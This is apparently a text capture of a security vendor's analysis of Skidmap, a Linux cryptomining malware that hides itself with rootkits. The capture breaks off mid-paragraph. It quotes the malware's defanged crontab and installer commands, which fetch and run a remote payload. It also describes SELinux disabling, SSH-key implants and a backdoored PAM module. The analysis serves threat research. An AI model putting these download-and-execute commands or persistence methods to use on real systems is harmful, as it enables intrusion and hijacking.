+Skidmap Malware Uses Rootkit to Hide Mining Payload
+
+Business 
+Cyber Threats
+Skidmap Malware Uses Rootkit to Hide
+Mining Payload
+Skidmap, a Linux malware that we recently stumbled upon, demonstrates the increasing
+complexity of cryptocurrency-mining threats. This malware is notable for how it loads malicious
+kernel modules to keep its cryptocurrency mining operations hidden.
+By: Augusto Remillano II, Jakub Urbanec, Wilbert Luy
+September 16, 2019
+Read time: 5 min (1338 words)
+  Subscribe
+Cryptocurrency-mining malware is still a prevalent threat, as illustrated by
+our detections of this threat in the  rst half of 2019. Cybercriminals, too,
+increasingly explored new platforms and ways to further cash in on their
+malware — from mobile devices and Unix and Unix-like systems to servers
+and cloud environments.
+They also constantly hone their malware’s resilience against detection.
+Some, for instance, bundle their malware with a watchdog component that
+ensures that the illicit cryptocurrency mining activities persist in the infected
+machine, while others, a ecting Linux-based systems, utilize an
+LD_PRELOAD-based userland rootkit to make their components
+undetectable by system monitoring tools.
+Skidmap, a Linux malware that we recently stumbled upon, demonstrates
+the increasing complexity of recent cryptocurrency-mining threats. This
+https://www.trendmicro.com/en_us/research/19/i/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload.html
+1/12
+2023/1/9 15:59
+Skidmap Malware Uses Rootkit to Hide Mining Payload
+malware is notable because of the way it loads malicious kernel modules to
+keep its cryptocurrency mining operations under the radar.
+These kernel-mode rootkits are not only more di cult to detect compared
+to its user-mode counterparts — attackers can also use them to gain
+unfettered access to the a ected system. A case in point: the way Skidmap
+can also set up a secret master password that gives it access to any user
+account in the system. Conversely, given that many of Skidmap’s routines
+require root access, the attack vector that Skidmap uses — whether
+through exploits, miscon gurations, or exposure to the internet — are most
+likely the same ones that provide the attacker root or administrative access
+to the system.
+Figure 1. Skidmap’s infection chain
+Skidmap’s infection chain
+https://www.trendmicro.com/en_us/research/19/i/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload.html
+2/12
+2023/1/9 15:59
+Skidmap Malware Uses Rootkit to Hide Mining Payload
+The malware installs itself via crontab (list of commands that are run on a
+regular schedule) to its target machine, as shown below:
+*/1 * * * * curl -fsSL hxxp://pm[.]ipfswallet[.]tk/pm.sh | sh 
+The installation script pm.sh then downloads the main binary “pc” (detected
+by Trend Micro as Trojan.Linux.SKIDMAP.UWEJX):
+if [ -x "/usr/bin/wget"  -o  -x "/bin/wget" ]; then 
+   wget -c hxxp://pm[.]ipfswallet[.]tk/pc -O /var/lib/pc && 
+chmod +x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/curl"  -
+o  -x "/bin/curl" ]; then 
+   curl -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && 
+chmod +x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/get"  -
+o  -x "/bin/get" ]; then 
+   get -c hxxp://pm[.]ipfswallet[.]tk/pc -O /var/lib/pc && chmod 
++x /var/lib/pc && /var/lib/pc elif [ -x "/usr/bin/cur"  -o  -x 
+"/bin/cur" ]; then 
+   cur -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && 
+chmod +x /var/lib/pc && /var/lib/pc else 
+   url -fs hxxp://pm[.]ipfswallet[.]tk/pc -o /var/lib/pc && 
+chmod +x /var/lib/pc && /var/lib/pc fi 
+Upon execution of the “pc” binary, it will decrease the a ected machine’s
+security settings. If the  le /usr/sbin/setenforce exists, the malware executes
+the command, setenforce 0. This command con gures the system’s
+Security-Enhanced Linux (SELinux) module, which provides support in the
+system's access control policies, into permissive mode — that is, setting the
+SELinux policy so that it is not enforced. If the system has the
+/etc/selinux/con g  le, it will write these commands into the  le:
+SELINUX=disabled and SELINUXTYPE=targeted commands. The former
+disables the SELinux policy (or disallows one to be loaded), while the latter
+sets selected processes to run in con ned domains.
+Skidmap also sets up a way to gain backdoor access to the machine. It does
+this by having the binary add the public key of its handlers to the
+https://www.trendmicro.com/en_us/research/19/i/skidmap-linux-malware-uses-rootkit-capabilities-to-hide-cryptocurrency-mining-payload.html
+3/12
+2023/1/9 15:59
+Skidmap Malware Uses Rootkit to Hide Mining Payload
+authorized_keys  le, which contains keys needed for authentication.
+Besides the backdoor access, Skidmap also creates another way for its
+operators to gain access to the machine. The malware replaces the system’s
+pam_unix.so  le (the module responsible for standard Unix authentication)
+with its own malicious version (detected as Backdoor.Linux.PAMDOR.A). As
